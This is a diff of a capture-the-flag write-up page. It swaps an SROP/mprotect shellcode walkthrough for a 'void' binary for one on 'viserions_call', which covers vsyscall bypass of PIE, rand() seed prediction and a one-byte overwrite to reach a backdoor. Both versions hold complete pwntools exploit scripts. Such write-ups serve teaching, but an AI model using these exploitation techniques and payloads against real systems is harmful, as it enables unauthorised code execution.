@@ -141,84 +141,307 @@ RELRO     : FULL<br>
 We see that in main, we are supposed to enter our name and password. They are then passed as arguments to <code>`password_check()`</code>. In password_ check, one can easily notice that the password string is <code>`s3cur3_p4ssw0rd`</code>. We also see that if the password is correct, a random value is being returned by the function. Let us not further look into the decompilation of main.
 	
 	<blockquote>
-		<code>```<br>
-			gef➤  info functions<br>
-			All defined functions:<br>
-
-Non-debugging symbols:<br>
-0x0000000000401000  main<br>
-0x0000000000401020  _start<br>
-gef➤  disas main<br>
-Dump of assembler code for function main:<br>
-   0x0000000000401000 <+0>:	mov    rax,0x0<br>
-   0x0000000000401007 <+7>:	mov    rdi,0x0<br>
-   0x000000000040100e <+14>:	mov    rsi,rsp<br>
-   0x0000000000401011 <+17>:	mov    rdx,0x7d0<br>
-   0x0000000000401018 <+24>:	syscall <br>
-   0x000000000040101a <+26>:	ret    <br>
-End of assembler dump.<br>
-gef➤  disas _start<br>
-Dump of assembler code for function _start:<br>
-   0x0000000000401020 <+0>:	xor    eax,eax<br>
-   0x0000000000401022 <+2>:	call   0x401000 <main><br>
-   0x0000000000401027 <+7>:	mov    rax,0x3c<br>
-   0x000000000040102e <+14>:	mov    rdi,0x0<br>
-   0x0000000000401035 <+21>:	syscall <br>
-   0x0000000000401037 <+23>:	ret    <br>
-End of assembler dump.<br>
-gef➤ <br>
-			```
+	<code>```<br>
+int __cdecl main(int argc, const char **argv, const char **envp)<br>
+{<br>
+  time_t v3; // rax<br>
+  FILE *v4; // rdi<br>
+  __int64 v5; // rdx<br>
+  __int64 v6; // rcx<br>
+  __int64 v7; // r8<br>
+  __int64 v8; // r9<br>
+  int res; // [rsp+Ch] [rbp-154h]<br>
+  __int64 buf; // [rsp+10h] [rbp-150h] BYREF<br>
+  __int64 v13; // [rsp+18h] [rbp-148h]<br>
+  __int64 pass; // [rsp+20h] [rbp-140h] BYREF<br>
+  __int64 (__fastcall *v15)(); // [rsp+38h] [rbp-128h]<br>
+  __int64 v16; // [rsp+40h] [rbp-120h]<br>
+  unsigned __int64 v17; // [rsp+158h] [rbp-8h]<br>
+<br>
+  v17 = __readfsqword(0x28u);<br>
+  initialize(argc, argv, envp);<br>
+  LODWORD(v16) = 0;<br>
+  v15 = password_view;<br>
+  v3 = time(0LL);<br>
+  LOBYTE(v3) = 0;<br>
+  srand(v3);<br>
+  puts("Please enter your credentials:\nName:");<br>
+  read(0, &buf, 0x14uLL);<br>
+  fflush(stdin);<br>
+  puts("Password:");<br>
+  read(0, (char *)&pass + 4, 0x50uLL);<br>
+  v4 = stdin;<br>
+  fflush(stdin);<br>
+  res = password_check((__int64)v4, (__int64)&pass + 4, v5, v6, v7, v8, buf, v13, pass);<br>
+  ((void (__fastcall *)(__int64 *))v15)(&buf);<br>
+  if ( res == (_DWORD)v16 )<br>
+    hidden_func();<br>
+  return __readfsqword(0x28u) ^ v17;<br>
+}<br>```
 	</code>
 </blockquote>
 
-<p>Above is the assmbly dump for the two functions `main` and `_start`. As we can see there are no other functions, and the binary is statically linked, with no procedure linkage table or got address available during run time. Due to this, it becomes a challenge to obtain a leak! </p>
-<p>Hoewever if we dive into the program, we can see that, the `main()` function reads input from user. However, there is no stack frame defined and rsi points to the top of the stack. So eventually whatever input we give, it will remain at the top of the stack and will get executed as the next instruction. <br></p>
-<p>So how do we go about it? Before discussing that, let us understand what does SROP mean and how it works.<br<</p>
+	<p> - Once random value is being stored into <code>`res`</code> after the function call, we see <code>`((void (__fastcall *)(__int64 *))v15)(&buf);`</code>. To proceed further one will have to somehow bypass the call on our input buffer as we do not have any address leak, nor is pie disabled. Thus we make use of a concept called <code>`vsyscall`</code>. <br></p>
 			
-<h2> SROP </h2>
-<p>SROP stands for Sigreturn Oriented Programming and unlike Return Oriented Programming (ROP), it requires only two gadgets: <code>syscall</code> and a way to set <code>rax</code> register to <code>0xf</code>. In this challenge, it was quite difficult to write 0xf to rax as there weren't suitable gadgets available. But we can make use of the read syscall in main() to read 0xf bytes of input. With this, rax will store the number of characters read, i.e 0xf. Then we call syscall on it. This process comprises of the sigreturn syscall. <br>
+<h2> Vsyscall </h2>
+<p>In any Windows/ Unix system, the program space is usually divided into a user space and a kernel space. In Linux, almost all operations in the user mode are encapsulated by glibc, which we can call directly. When it comes to harware operation and kernel, Linux provides us with rich system call functions to help us make requests to the system kernel.<br>
 
-The sigreturn is used to return from the signal handler and to clean up the stack frame after a signal has been unblocked. And "cleaning up the stack frame" really means it's restoring important context data that has been saved on the stack temporarily. This data includes values of all registers and some things that are unrelevant for exploitation, which is also the reason why at least 300 bytes are required for it to work. Since we can read upto 2000 bytes of data, it won't be a problem.<br>
+When we trigger the system call, we save vlues in registers and enter the kernel state to run the kernel function. Once the kernel function is completed, the return value is saved in the corresponding register in memory, and the register will be recovered and converted to user mode. This process needs to consume a certain amount of performance, so it will cause huge memory overhead for the frequently used system call functions. Therefore, Linux maps several common kernel calls from the kernel to the user layer space, thus introducing vsyscall.<br>
 
-For exploitation sake, we make use of <code>SigreturnFrame()</code> available in pwntools. We can in fact control all registers with this gadget. Before moving onto the exploit, I'd like to remind you that NX is enabled, and since there is no libc we canot ret2libc either. So to break this barrier, we can use the mprotect syscall, to give <code>rwx</code> permissions to a certain bss section, wherein we can read our shellcode to, and execute it. As there is no stack frame defined, we add a stack frame with <code>asm(add rsp, 100)</code>, place our shellcode into it, and execute it. (The shellcode used is an execve 64-bit) 
+In short, the memory of vsyscall stores the code of three system calls. The memory mapping of the code of these three system calls is fixed and will not change due to the opening of the PIE protection mechanism. We should use the code segment syscall;ret to jump to the memory we want to jump to.<br>
+We can view the memory layout of the process after execution of the program with PIE enabled.<br></p> 
 
+<blockquote>
+	<code>
+		```<br>
+		gdb-peda$ cat /proc/self/maps<br>
+55779ba14000-55779ba16000 r--p 00000000 08:09 4849787                    /bin/cat<br>
+55779ba16000-55779ba1b000 r-xp 00002000 08:09 4849787                    /bin/cat<br>
+55779ba1b000-55779ba1e000 r--p 00007000 08:09 4849787                    /bin/cat<br>
+55779ba1e000-55779ba1f000 r--p 00009000 08:09 4849787                    /bin/cat<br>
+55779ba1f000-55779ba20000 rw-p 0000a000 08:09 4849787                    /bin/cat<br>
+55779bf74000-55779bf95000 rw-p 00000000 00:00 0                          [heap]<br>
+7f085d62d000-7f085db9d000 r--p 00000000 08:09 9308748                    /usr/lib/locale/locale-archive<br>
+7f085db9d000-7f085dbc2000 r--p 00000000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f085dbc2000-7f085dd3a000 r-xp 00025000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f085dd3a000-7f085dd84000 r--p 0019d000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f085dd84000-7f085dd85000 ---p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f085dd85000-7f085dd88000 r--p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f085dd88000-7f085dd8b000 rw-p 001ea000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f085dd8b000-7f085dd91000 rw-p 00000000 00:00 0 <br>
+7f085ddb4000-7f085ddd6000 rw-p 00000000 00:00 0 <br>
+7f085ddd6000-7f085ddd7000 r--p 00000000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f085ddd7000-7f085ddfa000 r-xp 00001000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f085ddfa000-7f085de02000 r--p 00024000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f085de03000-7f085de04000 r--p 0002c000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f085de04000-7f085de05000 rw-p 0002d000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f085de05000-7f085de06000 rw-p 00000000 00:00 0 <br>
+7ffcbf2bc000-7ffcbf2dd000 rw-p 00000000 00:00 0                          [stack]<br>
+7ffcbf2f3000-7ffcbf2f6000 r--p 00000000 00:00 0                          [vvar]<br>
+7ffcbf2f6000-7ffcbf2f7000 r-xp 00000000 00:00 0                          [vdso]<br>
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]<br>
+		```
+	</code>
+</blockquote>
+	
+<blockquote>
+	<code>
+		```<br>
+		gdb-peda$ cat /proc/self/maps<br>
+558d734d3000-558d734d5000 r--p 00000000 08:09 4849787                    /bin/cat<br>
+558d734d5000-558d734da000 r-xp 00002000 08:09 4849787                    /bin/cat<br>
+558d734da000-558d734dd000 r--p 00007000 08:09 4849787                    /bin/cat<br>
+558d734dd000-558d734de000 r--p 00009000 08:09 4849787                    /bin/cat<br>
+558d734de000-558d734df000 rw-p 0000a000 08:09 4849787                    /bin/cat<br>
+558d7506d000-558d7508e000 rw-p 00000000 00:00 0                          [heap]<br>
+7f1ffc944000-7f1ffceb4000 r--p 00000000 08:09 9308748                    /usr/lib/locale/locale-archive<br>
+7f1ffceb4000-7f1ffced9000 r--p 00000000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f1ffced9000-7f1ffd051000 r-xp 00025000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f1ffd051000-7f1ffd09b000 r--p 0019d000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f1ffd09b000-7f1ffd09c000 ---p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f1ffd09c000-7f1ffd09f000 r--p 001e7000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f1ffd09f000-7f1ffd0a2000 rw-p 001ea000 08:09 4587910                    /lib/x86_64-linux-gnu/libc-2.31.so<br>
+7f1ffd0a2000-7f1ffd0a8000 rw-p 00000000 00:00 0 <br>
+7f1ffd0cb000-7f1ffd0ed000 rw-p 00000000 00:00 0 <br>
+7f1ffd0ed000-7f1ffd0ee000 r--p 00000000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f1ffd0ee000-7f1ffd111000 r-xp 00001000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f1ffd111000-7f1ffd119000 r--p 00024000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f1ffd11a000-7f1ffd11b000 r--p 0002c000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f1ffd11b000-7f1ffd11c000 rw-p 0002d000 08:09 4587902                    /lib/x86_64-linux-gnu/ld-2.31.so<br>
+7f1ffd11c000-7f1ffd11d000 rw-p 00000000 00:00 0 <br>
+7ffe1a944000-7ffe1a965000 rw-p 00000000 00:00 0                          [stack]<br>
+7ffe1a9a3000-7ffe1a9a6000 r--p 00000000 00:00 0                          [vvar]<br>
+7ffe1a9a6000-7ffe1a9a7000 r-xp 00000000 00:00 0                          [vdso]<br>
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]<br>
+		```<br>
+	</code>
+</blockquote>
+	
+<p> The above memory map is given for a pie enabled binary on different runs. We see that the memory mapping of vsyscall is always in the section.<br></p>		
+<blockquote><code>
+	`ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall] <br>`
+	</code></blockquote>
+<p> Usually, the position of the three system calls in vsyscall is also fixed. <br></p>
+
+<blockquote>
+	<code>
+		```<br>
+		   seg000:FFFFFFFFFF600000 ; Segment type: Pure code<br>
+    seg000:FFFFFFFFFF600000 seg000          segment byte public 'CODE' use64<br>
+    seg000:FFFFFFFFFF600000                 assume cs:seg000<br>
+    seg000:FFFFFFFFFF600000                 ;org 0FFFFFFFFFF600000h<br>
+    seg000:FFFFFFFFFF600000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing<br>
+    seg000:FFFFFFFFFF600000                 mov     rax, 60h<br>
+    seg000:FFFFFFFFFF600007                 syscall                 ; $!<br>
+    seg000:FFFFFFFFFF600009                 retn<br>
+    seg000:FFFFFFFFFF600009 ; ---------------------------------------------------------------------------<br>
+    seg000:FFFFFFFFFF60000A                 align 400h<br>
+    seg000:FFFFFFFFFF600400                 mov     rax, 0C9h<br>
+    seg000:FFFFFFFFFF600407                 syscall                 ; $!<br>
+    seg000:FFFFFFFFFF600409                 retn<br>
+    seg000:FFFFFFFFFF600409 ; ---------------------------------------------------------------------------<br>
+    seg000:FFFFFFFFFF60040A                 align 400h<br>
+    seg000:FFFFFFFFFF600800                 mov     rax, 135h<br>
+    seg000:FFFFFFFFFF600807                 syscall                 ; $!<br>
+    seg000:FFFFFFFFFF600809                 retn<br>
+    seg000:FFFFFFFFFF600809 ; ---------------------------------------------------------------------------<br>
+    seg000:FFFFFFFFFF60080A                 align 800h<br>
+    seg000:FFFFFFFFFF60080A seg000          ends<br>
+		```<br>
+	</code>
+</blockquote>
+<p>However, due to the detection mechanism for vsyscall, i.e code only being executed from the headers of these three system calls, one may not be able to choose any arbritrary syscall. We might be prompted with an error. This is also a kind of protection given for vsyscalls. Yet we understand that vsyscall is valuable when pie is enbaled.<br>
+Now that we have understood the concept behind use of vsyscall, in order to bypass the call on the buffer, we shall give a vsyscall segment address <code>`0xffffffffff600000`</code> and proceed to further checks.<br>
+Once the call on buffer is bypassed, we see a check done on <code>`v16`</code> with the <code>`res`</code> returned from <code>`pass_check`</code>. Since a random value was being returned, now our task is to bypass the random number check.<br></p>
+
+<h3> rand() check: </h3>
+
+<p> Every time we call the rand() function, it returns a random number. This function is usually used to generate a sequence of random number. But this often gets inconvenient if you want to reproduce the same sequence, for that we set the seed-value before calling rand() function. So essentially you can reset the random sequence generator by setting the seed-value and calling the rand function again it will reproduce the same sequence. You can set the seed value using srand() function.<br></p>
+
+<p> This can be done using the ctypes library in python. A libc has also been provided for the same. Thus our script for bypassing rand() check can look something like this!<br></p>
+
+<blockquote><code>```<br>
+	<br>
+from pwn import *<br>
+from ctypes import CDLL<br>
+<br>
+if __name__=="__main__":<br>
+	context.log_level="debug"<br>
+	<br>
+	#p = process('./viserions_call', env={"LD_PRELOAD" : "./libc.so.6"})<br>
+	p = remote('gc1.eng.run', 31459)<br>
+	libc = CDLL("libc.so.6")<br>
+	libc.srand(int(time.time()) & 0xffffff00)<br>
+	rand_val = libc.rand()<br>
+<br>
+	#gdb.attach(p, gdbscript='''b*main+95\n''')<br>
+	<br>
+	info("rand : %s"%rand_val)<br>
+	<br>
+	p.recvuntil('Name:\n')<br>
+	p.sendline('abcd')<br>
+	<br>
+	p.recvuntil('Password:\n')<br>
+<br>
+	pay = b's3cur3_p4ssw0rd\x00'<br>
+	pay += b'\x00'*(0x1c - 8 - len(pay))<br>
+	pay += p64(0xffffffffff600000)<br>
+	pay += p64(rand_val)<br>
+	<br>
+	p.send(pay)<br>
+	<br>```<br>
+	</code></blockquote>
+	
+	<p> Once the check is passed, <code>`hidden_func()`</code> is called.</p>
+	
+<h3> hidden_func(): </h3>
+	
+<p> Here is the decompilation for <code>`hidden_func():	`</code></p>
+
+<blockquote>
+	<code>```<br>
+		void hidden_func()<br>
+{<br>
+  __int64 buf[34]; // [rsp+0h] [rbp-110h] BYREF<br>
+<br>
+  buf[33] = __readfsqword(0x28u);<br>
+  puts("\nJump to:");<br>
+  read(0, buf, 0xFFuLL);<br>
+  __asm { jmp     [rbp+buf] }<br>
+}<br>
+<br>```<br>
+	</code>
+</blockquote>
+	
+	<p> As we can see, it reads in <code>`0xff`</code> bytes of input stream, and simply jumps to it. Our job is to find a way to call <code>`backdoor()`</code>. However, with pie enabled and no chance for leaks, one may find it difficult to provide the address for backdoor to jump to.<br></p>
+	
+	<p> However, we did see how vsyscall can be use to bypass the call on our buffer. We shall use the same concept, and change some code segment address on the stack to that of <code>`backdoor()`</code>. To do this, we will need to figure out the offset at which a suitable code address can be found on the stack, in order to overwrite the last byte of the address with that of backdoor's since we know for sure, even if pie is enabled the last 3 nibbles will always be the same. Bruteforce is not needed.</p>
+	
+<h3> checking for the offset </h3>
+
+<p> One can refer the below memory dump to find the offset. I have made use of a code segment address that was closest to the the backdoor function, so I will only have to change the last byte in order to jump to backdoor.<br></p>
+
+<blockquote><code>```<br>
+	gdb-peda$ x/40x $rbp-0x110<br>
+0x7ffcbed28130:	0x0000000000000d68	0x000000000000000a<br>
+0x7ffcbed28140:	0x00007f5304e716a0	0x000055b05bcd21c6<br>
+0x7ffcbed28150:	0x000055b05bcd4020	0x00007f5304e724a0<br>
+0x7ffcbed28160:	0x0000000000000000	0x00007f5304d19013<br>
+0x7ffcbed28170:	0x0000000000000011	0x00007f5304e716a0<br>
+0x7ffcbed28180:	0x000055b05bcd21c6	0x00007f5304ccf9c1<br>
+0x7ffcbed28190:	0x3bd948140000000f	0x4c85c70512f5c200<br>
+0x7ffcbed281a0:	0x000055b05bcd1200	0x00007f5304ccfe9d<br>
+0x7ffcbed281b0:	0x0000000000000000	0x000055b05bcd1418<br>
+0x7ffcbed281c0:	0x0000000000000d68	0x0000000f0000000a<br>
+0x7ffcbed281d0:	0x705f337275633373	0x0064723077737334<br>
+0x7ffcbed281e0:	0x000055b000000000	0x4c85c70512f5c200<br>
+0x7ffcbed281f0:	0x0000000000000000	0x000055b05bcd1650<br>
+0x7ffcbed28200:	0x00007ffcbed283b0	0x000055b05bcd1594<br>
+0x7ffcbed28210:	0x0000000a64636261	0x0000000000000000<br>
+0x7ffcbed28220:	0x7563337300000000	0x77737334705f3372<br>
+0x7ffcbed28230:	0x0000000000647230	0x4c85c70512f5c200<br>
+0x7ffcbed28240:	0x00007ffcbed283b0	0x000055b05bcd15c9<br>
+0x7ffcbed28250:	0x0000000000000000	0x3bd9481400000000<br>
+0x7ffcbed28260:	0x0000000061d973dd	0x00000000000e4ee8<br>
+gdb-peda$ p backdoor<br>
+$4 = {<text variable, no debug info>} 0x55b05bcd15df <backdoor><br>
+gdb-peda$ p 0x7ffcbed28208 - 0x7ffcbed28130<br>
+$5 = 0xd8<br>
+gdb-peda$ <br>
+	<br>```<br></code></blockquote>
+
+	<p> We see that, the address of <code>`backdoor`</code> is <code>`0x55b05bcd15df`</code> and the address at the 27th offset on the stack can be used to overwrite it to that of the backdoor function, using a single byte overwrite. Therefore our second part of the payload can look something like: <br>
+		
+		<blockquote>
+			<code>```<br>
+				ret_addr = 0xffffffffff600000<br>
+pay = p64(ret_addr)*27+'\xdf'<br>
+				```<br></code>
+	</blockquote></p>
+	
+	
+		
+	
 <h2> Exploit </h2>
 <blockquote><code>
 ```<br>
 from pwn import *<br>
-context.arch = 'amd64'<br>
-context.log_level = "debug"<br>
-
-#p = remote("tamuctf.com", 443, ssl=True, sni="void")<br>
-p = process('./void')<br>
-#gdb.attach(p, gdbscript='set disassembly-flavor intel\nb*main\nc\n')<br>
-
-main = 0x0000000000401000<br>
-ret = 0x40101a<br>
-syscall = 0x0000000000401018<br>
-start = 0x400020<br>
-
-frame = SigreturnFrame()<br>
-frame.rax = 10<br>
-frame.rdi = 0x00000000400000<br>
-frame.rsi = 0x1000<br>
-frame.rdx = 0x7<br>
-frame.rsp = 0x00000000400018# ptr to start<br>
-frame.rip = syscall# mprotect syscall<br>
-
-chain = p64(main)<br>
-
-print(str(frame))<br>
-pay = p64(main) + p64(syscall) + bytes(frame)<br>
-p.send(pay)<br>
-sleep(0.1)<br>
-
-p.send(p64(syscall).ljust(15, b'\x00'))<br>
-sleep(0.1)<br>
-p.send(p64(start) + asm('add rsp, 100') + asm(shellcraft.sh()))<br>
-sleep(0.1)<br>
-
+from ctypes import CDLL<br>
+<br>
+if __name__=="__main__":<br>
+	context.log_level="debug"<br>
+	<br>
+	#p = process('./viserions_call', env={"LD_PRELOAD" : "./libc.so.6"})<br>
+	p = remote('gc1.eng.run', 31459)<br>
+	libc = CDLL("libc.so.6")<br>
+	libc.srand(int(time.time()) & 0xffffff00)<br>
+	rand_val = libc.rand()<br>
+<br>
+	#gdb.attach(p, gdbscript='''b*main+95\n''')<br>
+	<br>
+	info("rand : %s"%rand_val)<br>
+	<br>
+	p.recvuntil('Name:\n')<br>
+	p.sendline(b'abcd')<br>
+	<br>
+	p.recvuntil('Password:\n')<br>
+<br>
+	pay = b's3cur3_p4ssw0rd\x00'<br>
+	pay += b'\x00'*(0x1c - 8 - len(pay))<br>
+	pay += p64(0xffffffffff600000)<br>
+	pay += p64(rand_val)<br>
+<br>
+	p.send(pay)<br>
+<br>
+	ret_addr = 0xffffffffff600000<br>
+	pay = p64(ret_addr)*27+'\xdf'<br>
+<br>
+	p.send(pay)<br>
+	s = p.recv()<br>
+	print(s)<br>
 p.interactive()<br>
+p.close()<br>
+<br>
 ```<br>
 	</code></blockquote>
 
